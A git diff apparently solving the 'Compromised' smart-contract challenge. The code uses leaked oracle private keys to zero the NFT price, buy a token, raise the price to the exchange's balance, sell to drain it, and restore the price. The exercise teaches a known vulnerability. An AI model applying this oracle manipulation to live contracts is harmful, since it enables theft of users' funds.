@@ -59,7 +59,33 @@ describe('Compromised challenge', function () {
   })
 
   it('Exploit', async function () {
-    /** CODE YOUR EXPLOIT HERE */
+    const pk1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9'
+    const pk2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
+    const wallet1 = new ethers.Wallet(pk1, ethers.provider)
+    const wallet2 = new ethers.Wallet(pk2, ethers.provider)
+
+    // 修改价格为0
+    await this.oracle.connect(wallet1).postPrice('DVNFT', 0)
+    await this.oracle.connect(wallet2).postPrice('DVNFT', 0)
+
+    // 购买NFT
+    await this.exchange.connect(attacker).buyOne({ value: 1 })
+    const filter = this.exchange.filters.TokenBought(attacker.address)
+    const event = (await this.exchange.queryFilter(filter)).pop()
+    const tokenId = event.args[1]
+
+    // 设置价格为合约余额
+    await this.oracle.connect(wallet1).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE)
+    await this.oracle.connect(wallet2).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE)
+
+    // 授权给交易所合约
+    await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId)
+    // 出售NFT
+    await this.exchange.connect(attacker).sellOne(tokenId)
+
+    // 设置初始价格
+    await this.oracle.connect(wallet1).postPrice('DVNFT', INITIAL_NFT_PRICE)
+    await this.oracle.connect(wallet2).postPrice('DVNFT', INITIAL_NFT_PRICE)
   })
 
   after(async function () {
